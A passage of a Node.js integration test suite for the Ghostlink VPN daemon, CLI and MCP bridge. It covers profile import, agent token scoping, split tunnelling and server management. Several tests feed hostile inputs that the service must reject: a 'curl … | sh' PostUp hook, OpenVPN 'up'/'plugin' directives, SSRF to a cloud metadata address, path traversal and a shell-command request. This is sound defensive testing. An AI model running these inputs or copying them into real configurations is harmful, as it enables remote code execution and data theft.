import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { spawn, execFileSync } from 'node:child_process';
import { once } from 'node:events';
import { promises as fs } from 'node:fs';
import { createHash } from 'node:crypto';
import zlib from 'node:zlib';
import path from 'node:path';
import net from 'node:net';
import readline from 'node:readline';
import Ajv from 'ajv/dist/2020.js';

const root = path.resolve(import.meta.dirname, '../..');
const windows = process.platform === 'win32';
const suffix = windows ? '.exe' : '';
const bin = path.join(root, 'target', process.env.GHOSTLINK_BUILD_PROFILE || 'debug');
const temp = path.join(root, `.state-test-${process.pid}`);
const state = path.join(temp, 'daemon');
const endpoint = windows ? `\\\\.\\pipe\\ghostlink-test-${process.pid}` : path.join(temp, 'control.sock');
const engine = process.env.GHOSTLINK_TEST_ENGINE || (windows ? path.join(root, '.tools/openvpn-bin/openvpn.exe') : '/usr/sbin/openvpn');
const outlineEngine = process.env.GHOSTLINK_TEST_OUTLINE_WORKER || path.join(bin, `ghostlink-tunnel${suffix}`);
const openssl = process.env.OPENSSL || (windows ? 'C:\\Program Files\\Git\\usr\\bin\\openssl.exe' : 'openssl');
const ajv = new Ajv({ strict: false });
const validateResponse = ajv.compile(JSON.parse(await fs.readFile(path.join(root, 'packages/shared-contracts/response.schema.json'))));
const validateStatus = ajv.compile(JSON.parse(await fs.readFile(path.join(root, 'packages/shared-contracts/status.schema.json'))));
let daemon;
let daemonErrors = '';
let profile;

// `killAfter` (ms) stops a CLI that would otherwise hang the suite.
function cli(args, expected = 0, { killAfter } = {}) {
  return new Promise((resolve, reject) => {
    const child = spawn(path.join(bin, `ghostlink${suffix}`), ['--endpoint', endpoint, '--json', ...args], { windowsHide: true });
    const guard = killAfter && setTimeout(() => child.kill(), killAfter);
    let stdout = '', stderr = '';
    child.stdout.on('data', data => stdout += data);
    child.stderr.on('data', data => stderr += data);
    child.on('error', reject);
    child.on('close', code => {
      clearTimeout(guard);
      try {
        assert.equal(code, expected, `exit mismatch: ${stdout} ${stderr}`);
        const response = JSON.parse(stdout);
        assert.ok(validateResponse(response), JSON.stringify(validateResponse.errors));
        assert.ok(!stdout.includes('BEGIN PRIVATE KEY'));
        resolve(response);
      } catch (e) { e.message += ` [ghostlink ${args.join(' ')}: stdout=${stdout.slice(0, 300)} stderr=${stderr.slice(0, 300)}]`; reject(e); }
    });
  });
}
function rpc(request) {
  return new Promise((resolve, reject) => {
    const socket = net.connect(endpoint);
    socket.setTimeout(15000, () => socket.destroy(new Error('IPC timeout')));
    let response = '';
    socket.on('connect', () => socket.write(JSON.stringify(request) + '\n'));
    socket.on('data', data => { response += data; if (response.includes('\n')) { socket.end(); resolve(JSON.parse(response)); } });
    socket.on('error', reject);
  });
}
async function start({ openvpn = engine, timeout = 3 } = {}) {
  daemonErrors = '';
  daemon = spawn(path.join(bin, `ghostlinkd${suffix}`), ['--endpoint', endpoint, '--data-dir', state, '--openvpn', openvpn, '--outline-engine', outlineEngine, '--connection-timeout-seconds', String(timeout)], { windowsHide: true });
  daemon.stderr.on('data', data => daemonErrors += data);
  daemon.on('error', () => {});
  for (let i = 0; i < 80; i++) {
    if (daemon.exitCode !== null) throw new Error(`Daemon exited: ${daemonErrors}`);
    try { const r = await cli(['status']); if (r.success) return; } catch {}
    await new Promise(resolve => setTimeout(resolve, 50));
  }
  throw new Error(`Daemon did not start: ${daemonErrors}`);
}
async function stop() {
  if (!daemon || daemon.exitCode !== null) return;
  const exited = once(daemon, 'exit');
  daemon.kill(); await exited;
}

before(async () => {
  await fs.mkdir(temp, { mode: 0o700 });
  await fs.writeFile(path.join(temp, 'openssl.cnf'), '[req]\ndistinguished_name=dn\n[dn]\n');
  execFileSync(openssl, ['req', '-x509', '-newkey', 'ec', '-pkeyopt', 'ec_paramgen_curve:P-256', '-nodes', '-days', '2', '-subj', '/CN=ghostlink-test', '-config', path.join(temp, 'openssl.cnf'), '-keyout', path.join(temp, 'client.key'), '-out', path.join(temp, 'client.crt')], { windowsHide: true, stdio: 'pipe' });
  const cert = await fs.readFile(path.join(temp, 'client.crt'), 'utf8');
  const key = await fs.readFile(path.join(temp, 'client.key'), 'utf8');
  profile = `client\ndev tun\nproto udp\nremote 127.0.0.1 1\nremote-cert-tls server\nconnect-timeout 1\nconnect-retry-max 1\n<ca>\n${cert}</ca>\n<cert>\n${cert}</cert>\n<key>\n${key}</key>\n`;
  await fs.writeFile(path.join(temp, 'singapore.ovpn'), profile);
  await start();
});
after(async () => { await stop(); await fs.rm(temp, { recursive: true, force: true }); });

test('actual named-pipe / Unix IPC reports disconnected with a valid JSON schema', async () => {
  const r = await cli(['status']); assert.ok(validateStatus(r.data), JSON.stringify(validateStatus.errors));
  assert.equal(r.data.status, 'disconnected'); assert.equal(r.data.vpn_ip, null);
});
test('import, list and default are persistent and contain no certificate secrets', async () => {
  const imported = (await cli(['profile', 'import', path.join(temp, 'singapore.ovpn')])).data;
  assert.equal(imported.name, 'singapore'); assert.equal(imported.is_default, true, 'the first import became the default');
  const r = await cli(['profile', 'list']); assert.equal(r.data.profiles.length, 1); assert.equal(r.data.profiles[0].is_default, true);
  await cli(['profile', 'default', 'singapore']);
  const persisted = await fs.readFile(path.join(state, 'state.json'), 'utf8'); assert.ok(!persisted.includes('BEGIN PRIVATE KEY'));
  if (windows) {
    const data = JSON.parse(persisted); const stored = Buffer.from(data.profiles.singapore.sealed_content).toString(); assert.ok(!stored.includes('PRIVATE KEY'));
  }
});
test('unsafe configuration cannot execute commands or disclose keys', async () => {
  for (const directive of ['up exploit.exe', 'plugin exploit.dll', 'config private.conf', 'auth-user-pass passwords.txt', 'cipher BF-CBC', 'tls-version-min 1.0', 'management 0.0.0.0 9000', 'setenv opt up exploit', 'verb 9']) {
    const r = await rpc({schema_version: 1, action: {type: 'profile_import', name: 'unsafe', content: profile + directive + '\n'}});
    assert.equal(r.success, false, directive); assert.equal(r.error.code, 'invalid_profile');
  }
  assert.equal((await cli(['profile', 'list'])).data.profiles.length, 1);
});
test('profile path traversal and malformed certificate are rejected', async () => {
  assert.equal((await rpc({schema_version: 1, action: {type: 'profile_import', name: '../escape', content: profile}})).error.code, 'invalid_profile');
  assert.equal((await rpc({schema_version: 1, action: {type: 'profile_import', name: 'badcert', content: profile.replace('BEGIN CERTIFICATE', 'BEGIN OTHER')}})).error.code, 'invalid_profile');
});
test('expired certificates are rejected at import', async () => {
  const resign = dates => execFileSync(openssl, ['x509', '-in', path.join(temp, 'client.crt'), '-signkey', path.join(temp, 'client.key'), ...dates, '-out', path.join(temp, 'expired.crt')], { windowsHide: true, stdio: 'pipe' });
  try {
    resign(['-days', '-1']);
  } catch {
    // OpenSSL 3.4 and later refuse negative days ("end date before start date") but can set the
    // dates themselves; earlier versions have no such options.
    resign(['-not_before', '20200101000000Z', '-not_after', '20200102000000Z']);
  }
  const expired = await fs.readFile(path.join(temp, 'expired.crt'), 'utf8');
  const r = await rpc({schema_version: 1, action: {type: 'profile_import', name: 'expired', content: profile.replace(/<cert>[\s\S]*?<\/cert>/, `<cert>\n${expired}</cert>`)}});
  assert.equal(r.error.code, 'invalid_profile'); assert.match(r.error.message, /expired/);
});
// OpenVPN routes that together cover every public IPv4 address make a full tunnel, as
// redirect-gateway does (code review 2026-11-10, Rust finding 1). On Unix the service, started
// here without --allow-full-tunnel, refuses to connect it before OpenVPN starts. On Windows
// nothing is connected, so this machine's routes are never touched.
test('OpenVPN routes that cover the internet are a full tunnel, refused without --allow-full-tunnel', async () => {
  const profiles = [
    ['halves', 'route 0.0.0.0 128.0.0.0\nroute 128.0.0.0 128.0.0.0\n', 'full'],
    ['quarters', 'route 0.0.0.0 192.0.0.0\nroute 64.0.0.0 192.0.0.0\nroute 128.0.0.0 192.0.0.0 vpn_gateway\nroute 192.0.0.0 192.0.0.0\n', 'full'],
    ['office', 'route 192.168.50.0 255.255.255.0\nroute 203.0.113.7\n', 'split'],
    ['bypass', 'route 0.0.0.0 128.0.0.0 net_gateway\nroute 128.0.0.0 128.0.0.0 net_gateway\n', 'split'],
  ];
  try {
    for (const [name, routes, mode] of profiles) {
      const r = await rpc({schema_version: 1, action: {type: 'profile_import', name, content: profile + routes}});
      assert.equal(r.success, true, `${name}: ${JSON.stringify(r.error)}`);
    }
    const listed = Object.fromEntries((await cli(['profile', 'list'])).data.profiles.map(p => [p.name, p.tunnel_mode]));
    for (const [name, , mode] of profiles) assert.equal(listed[name], mode, `${name} is ${listed[name]}`);
    const gaps = await rpc({schema_version: 1, action: {type: 'profile_import', name: 'gaps', content: profile + 'route 10.0.0.0 255.0.255.0\n'}});
    assert.equal(gaps.success, false); assert.equal(gaps.error.code, 'invalid_profile');
    if (!windows) {
      for (const name of ['halves', 'quarters']) {
        // Exit 3 is the CLI's code for a refused permission (as in the unprivileged test below).
        const refused = await cli(['connect', '--profile', name, '--timeout', '5'], 3);
        assert.equal(refused.error.code, 'permission_denied', name); assert.match(refused.error.message, /Full tunnel is disabled/);
      }
      assert.equal((await cli(['status'])).data.status, 'disconnected', 'a refused full tunnel starts nothing');
    }
  } finally {
    for (const [name] of profiles) await rpc({schema_version: 1, action: {type: 'profile_remove', name}});
  }
  assert.equal((await cli(['profile', 'list'])).data.profiles.length, 1);
});
test('32 concurrent status commands return valid real state', async () => {
  const results = await Promise.all(Array.from({length: 32}, () => cli(['status'])));
  assert.ok(results.every(r => validateStatus(r.data)));
});
test('unknown schema and arbitrary command requests fail closed', async () => {
  assert.equal((await rpc({schema_version: 99, action: {type: 'status'}})).error.code, 'invalid_request');
  assert.equal((await rpc({schema_version: 1, action: {type: 'shell', command: 'whoami'}})).error.code, 'invalid_request');
  // Actions and server operations without fields refuse extra keys as well.
  for (const action of [{type: 'status', profile: 'x'}, {type: 'disconnect', force: true}, {type: 'server_call', server: 'home', op: {op: 'info', path: '/etc'}}]) {
    assert.equal((await rpc({schema_version: 1, action})).error.code, 'invalid_request', JSON.stringify(action));
  }
});
test('read-only agent token is explicit, scoped, audited and revocable', async () => {
  const tokenPath = path.join(temp, 'readonly.token');
  const grant = await cli(['agent', 'grant', '--name', 'assistant', '--token-file', tokenPath]);
  assert.equal(grant.data.issued_token, undefined); assert.equal(grant.data.token_saved, true);
  const token = (await fs.readFile(tokenPath, 'utf8')).trim();
  assert.equal((await rpc({schema_version: 1, agent_token: token, action: {type: 'status'}})).success, true);
  assert.equal((await rpc({schema_version: 1, agent_token: token, action: {type: 'connect', profile: 'singapore'}})).error.code, 'permission_denied');
  assert.equal((await rpc({schema_version: 1, agent_token: token, action: {type: 'agent_grant', name: 'evil', control: true}})).error.code, 'permission_denied');
  const logs = await cli(['logs']); assert.ok(logs.data.entries.some(e => e.actor === 'agent:assistant')); assert.ok(!JSON.stringify(logs).includes(token));
  // Granting again into the same file is refused before the grant is replaced, so the saved
  // token keeps working.
  assert.equal((await cli(['agent', 'grant', '--name', 'assistant', '--control', '--token-file', tokenPath], 2)).error.code, 'invalid_request');
  assert.equal((await fs.readFile(tokenPath, 'utf8')).trim(), token);
  // Names are exact: revoking one that has no grant is an error, and the real grant stays.
  assert.equal((await cli(['agent', 'revoke', '--name', 'Assistant'], 2)).error.code, 'not_found');
  assert.equal((await rpc({schema_version: 1, agent_token: token, action: {type: 'status'}})).success, true);
  await cli(['agent', 'revoke', '--name', 'assistant']);
  assert.equal((await rpc({schema_version: 1, agent_token: token, action: {type: 'status'}})).error.code, 'permission_denied');
});
test('MCP advertises restricted tools and routes actual tool calls through the service', async () => {
  const tokenPath = path.join(temp, 'mcp.token'); await cli(['agent', 'grant', '--name', 'mcp', '--token-file', tokenPath]);
  const child = spawn(path.join(bin, `ghostlink-mcp${suffix}`), ['--endpoint', endpoint, '--token-file', tokenPath], { windowsHide: true });
  const lines = readline.createInterface({input: child.stdout}); const pending = [];
  lines.on('line', line => pending.shift()?.(JSON.parse(line)));
  const request = value => new Promise(resolve => { pending.push(resolve); child.stdin.write(JSON.stringify(value) + '\n'); });
  try {
    const init = await request({jsonrpc:'2.0', id:1, method:'initialize', params:{protocolVersion:'2025-11-25',capabilities:{},clientInfo:{name:'test',version:'1'}}}); assert.equal(init.result.serverInfo.name, 'ghostlink');
    const list = await request({jsonrpc:'2.0', id:2, method:'tools/list'}); assert.equal(list.result.tools.length, 3);
    const status = await request({jsonrpc:'2.0', id:3, method:'tools/call', params:{name:'vpn_status',arguments:{}}}); assert.equal(status.result.structuredContent.data.status, 'disconnected');
    const denied = await request({jsonrpc:'2.0', id:4, method:'tools/call', params:{name:'vpn_connect',arguments:{profile:'singapore'}}}); assert.equal(denied.error.code, -32602);
  } finally { child.stdin.end(); await once(child, 'exit'); lines.close(); }
});
test('actual OpenVPN engine cannot manufacture success for an unavailable server', async t => {
  try { await fs.access(engine); } catch { t.skip('Standalone OpenVPN not installed'); return; }
  // OpenVPN restarts after its server poll timeout (1 s) and then gives up (connect-retry-max 1).
  // With a deadline far beyond that, the attempt must end with OpenVPN's own failure: a restart
  // that waited in a management hold would only end at the deadline.
  await stop(); await start({ timeout: 20 });
  try {
    const seen = new Set(); let done = false;
    const watch = (async () => {
      while (!done) { seen.add((await rpc({schema_version: 1, action: {type: 'status'}})).data.status); await new Promise(resolve => setTimeout(resolve, 100)); }
    })();
    const r = await cli(['connect', '--profile', 'singapore', '--timeout', '35'], 1);
    done = true; await watch;
    assert.equal(r.error.code, 'connection_failed');
    const state = (await cli(['status'])).data; assert.equal(state.status, 'failed'); assert.ok(state.last_error); assert.equal(state.vpn_ip, null);
    assert.notEqual(state.last_error, 'connection_timeout', 'OpenVPN waited for a hold release after its restart');
    assert.ok(!seen.has('reconnecting'), `a first attempt is never reconnecting (seen: ${[...seen]})`);
    await cli(['disconnect']); assert.equal((await cli(['status'])).data.status, 'disconnected');
  } finally { await stop(); await start(); }
});
test('state survives a daemon restart without pretending a tunnel survived', async () => {
  await stop(); await start();
  assert.equal((await cli(['profile', 'list'])).data.profiles[0].name, 'singapore');
  assert.equal((await cli(['status'])).data.status, 'disconnected');
});
test('a failed autoconnect at startup keeps the service reachable and reports the failure', async () => {
  await cli(['autoconnect', 'enable']);
  await stop();
  // Make engine start fail with an internal error before anything is spawned: the private
  // runtime directory path is occupied by a regular file.
  const run = path.join(state, 'run');
  await fs.rm(run, { recursive: true, force: true }); await fs.writeFile(run, '');
  try {
    // Any existing absolute file passes the engine-path check; it is never executed here.
    await start({ openvpn: process.execPath });
    const status = (await cli(['status'])).data;
    assert.equal(status.status, 'failed'); assert.equal(status.last_error, 'autoconnect_failed'); assert.equal(status.vpn_ip, null);
    // A refused attempt (here no OpenVPN at the configured path; at boot often a dynamic key
    // whose host is not reachable yet) is reported the same way, and the audit names why.
    await stop(); await start({ openvpn: path.join(temp, 'missing-openvpn.exe') });
    const refused = (await cli(['status'])).data;
    assert.equal(refused.status, 'failed'); assert.equal(refused.last_error, 'autoconnect_failed');
    assert.equal((await cli(['autoconnect', 'disable'])).data.autoconnect, false);
    const logs = (await cli(['logs'])).data.entries;
    assert.ok(logs.some(e => e.operation === 'autoconnect' && e.outcome === 'error'));
    assert.ok(logs.some(e => e.operation === 'autoconnect' && e.outcome === 'engine_unavailable'));
  } finally {
    await stop(); await fs.rm(run, { force: true }); await start();
  }
  assert.equal((await cli(['status'])).data.status, 'disconnected');
});
test('crash leftovers are removed at startup and do not block state writes', async () => {
  await stop();
  await fs.mkdir(path.join(state, 'run'), { recursive: true });
  await fs.writeFile(path.join(state, 'state.pending'), 'uncommitted');
  await fs.writeFile(path.join(state, 'run', 'outline.json'), '{"password":"stale-plaintext-credential"}');
  await fs.writeFile(path.join(state, 'run', 'outline.pending'), '');
  await start();
  for (const leftover of ['state.pending', path.join('run', 'outline.json'), path.join('run', 'outline.pending')]) {
    await assert.rejects(fs.access(path.join(state, leftover)), `${leftover} should be removed`);
  }
  await cli(['profile', 'default', 'singapore']);
  assert.equal((await cli(['profile', 'list'])).data.profiles[0].name, 'singapore');
});
test('version is local, unknown profile exit is predictable, and switch validates target first', async () => {
  assert.equal((await cli(['version'])).data.version, '0.8.6');
  assert.equal((await cli(['connect', '--profile', 'missing'], 2)).error.code, 'not_found');
  assert.equal((await cli(['switch', '--profile', 'missing'], 2)).error.code, 'not_found');
});
test('Outline access keys import privately, rename, select default and remove through actual IPC', async () => {
  const secret = 'private-access-credential-do-not-output';
  const credential = Buffer.from(`chacha20-ietf-poly1305:${secret}`).toString('base64url');
  const keyPath = path.join(temp,'outline-access.txt');
  await fs.writeFile(keyPath,`ss://${credential}@127.0.0.1:1/?outline=1#Singapore`,{mode:0o600});
  const r = await cli(['key','add','--name','outline-singapore','--file',keyPath]);
  assert.equal(r.data.kind,'outline'); assert.equal(r.data.display_name,'Singapore'); assert.equal(r.data.certificate_expires_unix,null);
  assert.ok(!JSON.stringify(r).includes(secret)); assert.ok(!JSON.stringify(r).includes(credential));
  // The fingerprint visible to read-only agents must not be a plain hash of the credential.
  const plainHash = createHash('sha256').update(await fs.readFile(keyPath, 'utf8')).digest('hex');
  assert.match(r.data.sha256, /^[0-9a-f]{64}$/); assert.notEqual(r.data.sha256, plainHash);
  // An existing server ID is never silently overwritten.
  assert.equal((await cli(['key','add','--name','outline-singapore','--file',keyPath], 2)).error.code, 'invalid_request');
  assert.equal((await cli(['key','add','--name','outline-singapore','--file',keyPath,'--replace'])).data.name, 'outline-singapore');
  assert.equal((await cli(['profile','import',path.join(temp,'singapore.ovpn')], 2)).error.code, 'invalid_request');
  const renamed = await rpc({schema_version:1,action:{type:'profile_rename',name:'outline-singapore',display_name:'My Singapore'}}); assert.equal(renamed.data.display_name,'My Singapore');
  await cli(['profile','default','outline-singapore']);
  await cli(['autoconnect','enable']);
  const info = (await cli(['info'])).data; assert.equal(info.autoconnect,true);
  for (const kind of ['outline-compatible-shadowsocks','vless','wireguard','amneziawg','openvpn2-management']) assert.ok(info.engines.includes(kind), kind);
  await cli(['autoconnect','disable']);
  const metadata = await cli(['profile','list']); assert.ok(!JSON.stringify(metadata).includes(secret));
  // A pipe that never closes cannot hold the CLI past --timeout (the suite never closes stdin).
  assert.equal((await cli(['key','add','--name','never-closed','--stdin','--timeout','2'],5,{ killAfter: 20000 })).error.code,'timeout');
  if (process.env.GHOSTLINK_TEST_EXPECT_UNPRIVILEGED === '1') {
    if (windows) {
      const failure = await cli(['connect','--profile','outline-singapore','--timeout','25'],1);
      assert.equal(failure.error.code,'connection_failed');
      const status = (await cli(['status'])).data;
      assert.equal(status.status,'failed'); assert.equal(status.vpn_ip,null);
      // The worker reported this failed start as clean (it undid what it changed), so no
      // inspection is asked for: trying again fails the same way, not with cleanup_unverified
      // (code review 2026-11-10, Rust finding 2).
      assert.ok(!/cleanup_unverified/.test(status.last_error ?? ''), status.last_error);
      assert.equal((await cli(['connect','--profile','outline-singapore','--timeout','25'],1)).error.code,'connection_failed');
      await cli(['disconnect']);
    } else {
      // Linux refuses a full tunnel before any engine starts unless the administrator allowed it.
      assert.equal((await cli(['connect','--profile','outline-singapore','--timeout','25'],3)).error.code,'permission_denied');
      assert.equal((await cli(['status'])).data.status,'disconnected');
    }
    await assert.rejects(fs.access(path.join(state,'run','outline.json')));
  }
  const logs = await cli(['logs']); assert.ok(!JSON.stringify(logs).includes(secret));
  if (windows) {
    const persisted = JSON.parse(await fs.readFile(path.join(state,'state.json'),'utf8'));
    assert.ok(!Buffer.from(persisted.profiles['outline-singapore'].sealed_content).toString().includes('ss://'));
  }
  await cli(['profile','remove','outline-singapore']); assert.equal((await cli(['info'])).data.default_profile,null);
});
test('WireGuard, AmneziaWG, VLESS and Amnezia vpn:// keys import with strict validation', async () => {
  const privateKey = 'yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=', publicKey = 'xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=';
  const conf = extra => `[Interface]\nPrivateKey = ${privateKey}\nAddress = 10.8.1.2/32\nDNS = 1.1.1.1\n${extra}\n[Peer]\nPublicKey = ${publicKey}\nEndpoint = 203.0.113.5:51820\nAllowedIPs = 0.0.0.0/0\n`;
  const write = async (name, text) => { const file = path.join(temp, name); await fs.writeFile(file, text, { mode: 0o600 }); return file; };
  const amnezia = document => {
    const json = Buffer.from(JSON.stringify(document));
    const length = Buffer.alloc(4); length.writeUInt32BE(json.length);
    return 'vpn://' + Buffer.concat([length, zlib.deflateSync(json, { level: 8 })]).toString('base64url');
  };
  assert.equal((await cli(['profile', 'import', await write('home.conf', conf('MTU = 1420')), '--name', 'wg-home'])).data.kind, 'wireguard');
  const awg = await cli(['profile', 'import', await write('awg.conf', conf('Jc = 4\nJmin = 10\nJmax = 50\nS1 = 24\nS2 = 28\nH1 = 100-199\nH2 = 200-299\nH3 = 300-399\nH4 = 400-499')), '--name', 'awg-home']);
  assert.equal(awg.data.kind, 'amneziawg'); assert.equal(awg.data.remotes[0].protocol, 'udp');
  for (const [file, text] of [['hook.conf', conf('PostUp = curl https://example.invalid | sh')], ['table.conf', conf('Table = off')]]) {
    assert.equal((await cli(['profile', 'import', await write(file, text), '--name', 'rejected'], 2)).error.code, 'invalid_profile');
  }
  const vless = `vless://8f3d2c1b-1a2b-4c3d-9e8f-0123456789ab@203.0.113.7:443?type=tcp&security=reality&sni=www.googletagmanager.com&fp=chrome&pbk=Z84J2IelR9ch3k8VtlVhhs5ycBUlXA7wHBWcBrjqnAw&sid=0123abcd&flow=xtls-rprx-vision#Reality`;
  const vlessResult = await cli(['key', 'add', '--name', 'vless-tokyo', '--file', await write('vless.txt', vless)]);
  assert.equal(vlessResult.data.kind, 'vless'); assert.equal(vlessResult.data.display_name, 'Reality');
  assert.equal((await cli(['key', 'add', '--name', 'rejected', '--file', await write('plain.txt', vless.replace('security=reality', 'security=none'))], 2)).error.code, 'invalid_profile');
  const last = { client_priv_key: privateKey, client_ip: '10.8.1.2', server_pub_key: publicKey, hostName: '203.0.113.5', port: 41820, allowed_ips: ['0.0.0.0/0'],
    Jc: '4', Jmin: '10', Jmax: '50', S1: '24', S2: '28', H1: '100-199', H2: '200-299', H3: '300-399', H4: '400-499' };
  const document = { containers: [{ container: 'amnezia-awg2', awg: { last_config: JSON.stringify(last) } }], defaultContainer: 'amnezia-awg2', description: 'Amnezia Test', dns1: '1.1.1.1' };
  const imported = await cli(['key', 'add', '--name', 'amnezia-test', '--file', await write('amnezia.txt', amnezia(document))]);
  assert.equal(imported.data.kind, 'amneziawg'); assert.equal(imported.data.display_name, 'Amnezia Test');
  const fullAccess = await cli(['key', 'add', '--name', 'rejected', '--file', await write('admin.txt', amnezia({ ...document, userName: 'root', password: 'ssh-secret-never-shown' }))], 2);
  assert.match(fullAccess.error.message, /full-access/); assert.ok(!JSON.stringify(fullAccess).includes('ssh-secret-never-shown'));
  const listed = JSON.stringify(await cli(['profile', 'list']));
  assert.ok(!listed.includes(privateKey) && !listed.includes('8f3d2c1b-1a2b'));
  if (windows) {
    const persisted = await fs.readFile(path.join(state, 'state.json'), 'utf8');
    assert.ok(!persisted.includes(privateKey));
    // Sealed content is stored as a list of numbers: decode it, or the check above cannot fail.
    const profiles = JSON.parse(persisted).profiles;
    for (const [name, secret] of [['wg-home', privateKey], ['awg-home', privateKey], ['vless-tokyo', '8f3d2c1b-1a2b']]) {
      assert.ok(!Buffer.from(profiles[name].sealed_content).toString().includes(secret), `${name} is not sealed`);
    }
  }
  for (const name of ['wg-home', 'awg-home', 'vless-tokyo', 'amnezia-test']) await cli(['profile', 'remove', name]);
});
test('split tunneling policies validate, persist per scope and stay owner-only', async () => {
  assert.equal((await cli(['split', 'show'])).data.policy.mode, 'full');
  const set = await cli(['split', 'set', '--mode', 'bypass', '--site', '*.Example.com', '--site', 'bank.example', '--ip', '192.168.1.0/24', '--app', 'chrome.exe', '--lan-direct']);
  assert.deepEqual(set.data.policy.domains, ['example.com', 'bank.example']); assert.equal(set.data.applies, 'next_connection');
  const shown = (await cli(['split', 'show'])).data.policy;
  assert.equal(shown.mode, 'bypass'); assert.equal(shown.lan_direct, true); assert.deepEqual(shown.apps, ['chrome.exe']);
  for (const bad of [['--site', 'not a site'], ['--ip', '10.0.0.0/40'], ['--mode', 'only']]) {
    const args = bad[0] === '--mode' ? ['split', 'set', ...bad] : ['split', 'set', '--mode', 'bypass', ...bad];
    assert.equal((await cli(args, 2)).error.code, 'invalid_request');
  }
  const conf = `[Interface]\nPrivateKey = yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=\nAddress = 10.8.1.2/32\n[Peer]\nPublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=\nEndpoint = 203.0.113.5:51820\nAllowedIPs = 0.0.0.0/0\n`;
  const confFile = path.join(temp, 'split.conf'); await fs.writeFile(confFile, conf, { mode: 0o600 });
  await cli(['profile', 'import', confFile, '--name', 'split-home']);
  assert.equal((await cli(['split', 'show', '--profile', 'split-home'])).data.follows_global, true);
  await cli(['split', 'set', '--profile', 'split-home', '--mode', 'only', '--site', 'corp.example']);
  const override = (await cli(['split', 'show', '--profile', 'split-home'])).data;
  assert.equal(override.follows_global, false); assert.equal(override.policy.mode, 'only');
  await cli(['profile', 'import', confFile, '--name', 'split-home', '--replace']);
  assert.equal((await cli(['split', 'show', '--profile', 'split-home'])).data.policy.mode, 'only', 'replace keeps the override');
  await cli(['split', 'clear', '--profile', 'split-home']);
  assert.equal((await cli(['split', 'show', '--profile', 'split-home'])).data.follows_global, true);
  assert.equal((await cli(['split', 'show', '--profile', 'missing'], 2)).error.code, 'not_found');
  const tokenPath = path.join(temp, 'split.token'); await cli(['agent', 'grant', '--name', 'split-agent', '--control', '--token-file', tokenPath]);
  const token = (await fs.readFile(tokenPath, 'utf8')).trim();
  for (const action of [{ type: 'routing_policy_get' }, { type: 'routing_policy_set', policy: null }]) {
    assert.equal((await rpc({ schema_version: 1, agent_token: token, action })).error.code, 'permission_denied');
  }
  await cli(['agent', 'revoke', '--name', 'split-agent']);
  await cli(['split', 'clear']); await cli(['profile', 'remove', 'split-home']);
  assert.equal((await cli(['split', 'show'])).data.policy.mode, 'full');
});
test('dynamic key SSRF, obsolete ciphers and plugins fail without exposing credentials', async () => {
  for (const access_key of ['ssconf://127.0.0.1/private','ssconf://169.254.169.254/latest/meta-data','ss://none:top-secret@example.com:443','ss://aes-256-gcm:top-secret@example.com:443?plugin=evil']) {
    const r = await rpc({schema_version:1,action:{type:'access_key_import',name:'rejected',access_key}});
    assert.equal(r.success,false); assert.ok(!JSON.stringify(r).includes('top-secret'));
  }
});
test('a real Ghostlink server is managed through its pinned management key', async t => {
  const serverBin = process.env.GHOSTLINK_TEST_SERVER || path.join(bin, `ghostlink-server${suffix}`);
  try { await fs.access(serverBin); } catch { t.skip(`build ${serverBin} to run this test`); return; }
  const dir = path.join(temp, 'ghostlink-server');
  const key = execFileSync(serverBin, ['init', '--state', dir, '--hostname', '127.0.0.1'], { windowsHide: true, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] });
  const management = JSON.parse(key);
  const secret = new URL(management.apiUrl).pathname.slice(1);
  const write = async (name, text) => { const file = path.join(temp, name); await fs.writeFile(file, text, { mode: 0o600 }); return file; };
  const keyFile = await write('management-key.json', key);
  const server = spawn(serverBin, ['serve', '--state', dir, '--log-level', 'error'], { windowsHide: true, stdio: 'ignore' });
  t.after(() => { if (server.exitCode === null) server.kill(); });
  let added;
  for (let i = 0; i < 60 && !added; i++) {
    try { added = await cli(['server', 'add', '--name', 'home', '--label', '  My home server  ', '--key-file', keyFile]); }
    catch { await new Promise(resolve => setTimeout(resolve, 100)); }
  }
  assert.ok(added, 'the server did not come up');
  assert.equal(added.data.endpoint, new URL(management.apiUrl).host);
  // A new server runs only Shadowsocks; the other protocols have their ports and keys but are off.
  assert.equal(added.data.protocols.shadowsocks.enabled, true);
  for (const p of ['amneziawg', 'wireguard', 'vless']) assert.equal(added.data.protocols[p].enabled, false, `${p} is off on a new server`);
  assert.equal((await cli(['server', 'add', '--name', 'home', '--key-file', keyFile], 2)).error.code, 'invalid_request', 'no silent overwrite');
  const listed = await cli(['server', 'list']);
  assert.equal(listed.data.servers[0].name, 'home');
  // The name given on this device is kept (cleaned), apart from the ID and from the server's own name.
  assert.equal(added.data.label, 'My home server');
  assert.equal(listed.data.servers[0].label, 'My home server');
  assert.notEqual(listed.data.servers[0].label, listed.data.servers[0].server_name);
  assert.ok(!JSON.stringify(listed).includes(secret) && !JSON.stringify(listed).includes(management.certSha256));
  if (windows) {
    const persisted = await fs.readFile(path.join(state, 'state.json'), 'utf8');
    assert.ok(!persisted.includes(secret));
    // The sealed key is stored as a list of numbers: decode it, or the check above cannot fail.
    assert.ok(!Buffer.from(JSON.parse(persisted).managed_servers.home.sealed_key).toString().includes(secret), 'the management key is not sealed');
  }

  const alice = await cli(['server', 'users', 'add', '--server', 'home', '--name', 'Alice', '--data-limit-gb', '5']);
  assert.equal(alice.data.data_limit_bytes, 5e9);
  const user = alice.data.id;
  // A delete is answered with no data, which is a success.
  const temporary = await cli(['server', 'users', 'add', '--server', 'home', '--name', 'Temporary']);
  assert.equal((await cli(['server', 'users', 'remove', '--server', 'home', '--user', temporary.data.id])).data, null);
  // Keys for a protocol that is off are refused until it is turned on (this also tries its port).
  assert.ok((await cli(['server', 'keys', 'create', '--server', 'home', '--user', user, '--protocol', 'amneziawg'], 2)).error.message.includes('turned off'));
  const on = await cli(['server', 'set', '--server', 'home', '--enable', 'amneziawg', '--enable', 'wireguard', '--enable', 'vless']);
  assert.ok(['amneziawg', 'wireguard', 'vless'].every(p => on.data.protocols[p].enabled));
  const imported = await cli(['server', 'keys', 'create', '--server', 'home', '--user', user, '--protocol', 'amneziawg', '--import', 'alice-awg']);
